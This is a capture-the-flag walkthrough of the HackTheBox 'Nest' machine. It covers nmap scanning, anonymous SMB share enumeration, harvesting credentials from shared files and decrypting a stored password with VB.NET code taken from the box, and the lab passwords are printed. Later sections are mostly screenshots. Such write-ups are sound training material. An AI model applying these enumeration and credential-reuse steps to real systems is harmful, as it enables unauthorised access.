# Synopsis
In the following walkthrough, we're gonna have a closer look at a chosen machine from HackTheBox. For those of you, who are not familiar with the name yet, HTB is an advanced online platform for grinding your penetration testing skills and sharpening infosec capabilities. Getting user and root on the box will require us to perform various SMB & Windows enumeration. After doing it right, we will find the flag, which is the ultimate goal of this challenge.

## Initial Scan
Let us kick things off with a preliminary scan
```console
$ sudo nmap -sV -Pn -A -T4 -v -p- 10.10.10.178
```
> an unprivileged Nmap scan will use the TCP Connect scan (-sT), whereas a privileged one will use TCP Syn Stealth (-sS)

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/Nmap-Nest.png)
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/Nmap-scan-result.png)

It reveals to us two interesting services running on this box:
* SMB (445/TCP)
* HQK Reporting Service V1.2 (4386/TCP)

Having figured out what are we dealing with in this case, we can start enumerating the SMB shares. Now it's just a matter of trying null session and digging deeper to find any reliable credentials.

## SMB Shares Enumeration
Port 445 is opened and literally waiting for our initial actions. Utilizing `smbclient` at this moment seems like a good idea. 
```
$ smbclient -L \\\\10.10.10.178
```

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/smbclient-listing-shares.png)
Both `Data` & `Users` shares look like they are accessible via null session (anonymously).

Before we make any moves, let's list all the available users

```
$ smbclient \\\\10.10.10.178\\Users
```
Enabling directory recursion \
`smb: \> recurse` \
And listing assets \
`smb: \> ls`
The result is an error NT_STATUS_ACCESS_DENIED
Next step will be giving a try to a different Share named `Users`
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/smbclient-listing-users.png)

OK, above information might be helpful later. Now let's move one step further and see what does the `Data` directory hides.

```
$ smbclient \\\\10.10.10.178\\Data
``` 
`smb: \> recurse` \
`smb: \> ls`

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/smbclient-listing-data.png)

Basically, what should immediately strike our attention here are two files. Their names are `Maintenance Alerts.txt` & `Welcome Email.txt` respectively. Let's retrieve them with `smbclient`. \
Firstly, we exit the smbclient `smb: \> exit` \
Then, we create a directory labeled Data as a destination for our files
```console
$ mkdir Data
```
```console
$ cd Data
```
```console
$ smbclient \\\\10.10.10.178\\Data
```
`smb: \> recurse` \
`smb: \> prompt` \
We're gonna download all of the assets at once with the following command
`smb: \> mget *` \
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/mget-data-share.png)
After reading the content of .txt files, we obtain credentials for `TempUser`
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/sublimetext-data.png)
Time to make use of our discovery
```
$ smbclient \\\\10.10.10.178\\Data -U TempUser
```
`smb: \> recurse` \
`smb: \> prompt` \
`smb: \> mget *`
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/smbclient-data-tempuser.png)

Careful analysis of the content results in gathering valuable information from .xml files \
Path to the 1st interesting file **Data/IT/Configs/RU Scanner/RU_Config.xml**
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/ru-config-xml.png)
The password obviously looks like as if it were encrypted. Unfortunately using it to authenticate to SMB shares doesn't work. Seems like the only way to use it, is to decrypt it in advance. 
Path to the 2nd interesting file **Data/IT/Configs/NotepadPlusPlus/config.xml**
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/IT-Carl-Temptxt.png)
Secure share looks tempting. Wonder whether we can access anything inside it?
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/smbclient-listing-secure.png)

We weren't allowed to list `IT`, though there was no problem with listing `IT\Carl\` directory. The quick decision is to recursively download its content. 

Moreover, a careful eye can spot the `WIP` directory, which contains some Visual Basic source code. Turns out `Module1.vb` utilizes `Utils.vb` to decrypt a password it gets from `RU_config.xml`

We can connect the pieces of code and run it in an online compiler. Seems like **dotnedfiddle.net** will do the job.

We're gonna need the following part from  `Utils.vb`
```vbnet
Imports System.Text
Imports System.Security.Cryptography
Public Class Utils

' This is the beginning of the *Public Class ConfigFile*

      Public Class ConfigFile
            Public Property Port As Integer
            Public Property Username As String
            Public Property Password As String
    
            Public Sub SaveToFile(Path As String)
                Using File As New System.IO.FileStream(Path, System.IO.FileMode.Create)
                    Dim Writer As New System.Xml.Serialization.XmlSerializer(GetType(ConfigFile))
                    Writer.Serialize(File, Me)
                End Using
            End Sub
      
            Public Shared Function LoadFromFile(ByVal FilePath As String) As ConfigFile
                Using File As New System.IO.FileStream(FilePath, System.IO.FileMode.Open)
                    Dim Reader As New System.Xml.Serialization.XmlSerializer(GetType(ConfigFile))
                    Return DirectCast(Reader.Deserialize(File), ConfigFile)
                End Using
            End Function
            
            
      End Class
     
' This is the end of the *Public Class ConfigFile*

        Public Shared Function DecryptString(EncryptedString As String) As String
            If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
            Else
               Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
           End If
       End Function

' Here we cut the Public Shared Function Encrypt 'cause we don't need it anymore

    Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = System.Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As System.IO.MemoryStream
        memoryStream = New System.IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)
        System.Console.WriteLine(plainText)                             ' THIS PART IS CRUCIAL FOR WRITING THE OUTPUT (DECRYPTED STRING)
        Return plainText
    End Function

' This is the beginning of the Public Class SsoIntegration

Public Class SsoIntegration
    Public Property Username As String
    Public Property Password As String
End Class

' This is the end of the Public Class SsoIntegration

' This is the beginning of the part from Module1.vb

    Sub Main()
                Dim test As New SsoIntegration With {.Username = "C.Smith", .Password = Utils.DecryptString("PUT THE STRING FROM RU_Config.xml HERE")}
    End Sub
    
' This is the end of the part from Module1.vb

End Class
```
Finally we've got the C.Smith password decrypted for us. In plaintext it looks like this: `xRxRxPANCAK3SxRxRx` 
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/dotnetfiddle-output.png)

In order to retrieve user flag
```console
smb: \C.Smith\> get user.txt
getting  file \C.Smith\user.txt of size 32 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/user-flag.png)

## Further enumeration (port 4386)

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/HQK-debug-mode.png)

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/debug-mode-enabled-additional-commands.png)
Commands were quite easy to understand:

LIST is similar to ls/dir
SHOWQUERY shows the content of a file
RUNQUERY basically executes/reads a chosen file
SETDIR change directory (cd)

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/HQK-current-directory.png)

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/setdir-LDAP.png)
Encrypted password was hidden in the .conf file

Now let's download the HqkLdap binary
```bash
$ smbclient \\\\10.10.10.178\\Users -U C.Smith
```
`cd C.Smith` -> `ls` -> `cd "HQK Reporting"` -> `ls` -> `cd "AD Integration Module"` -> `dir` -> `get HqkLdap.exe`
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/get-HqkLdap.exe.png)

## Binary analysis

Executing the .NET binary in the cmd, shows that we lack some important file
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/smbclient-user-administrator.png)



## Privilege escalation

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/smbclient-user-administrator.png)

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/get-root-txt.png)

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Nest/img/root-flag.png)

Thank you for joining me
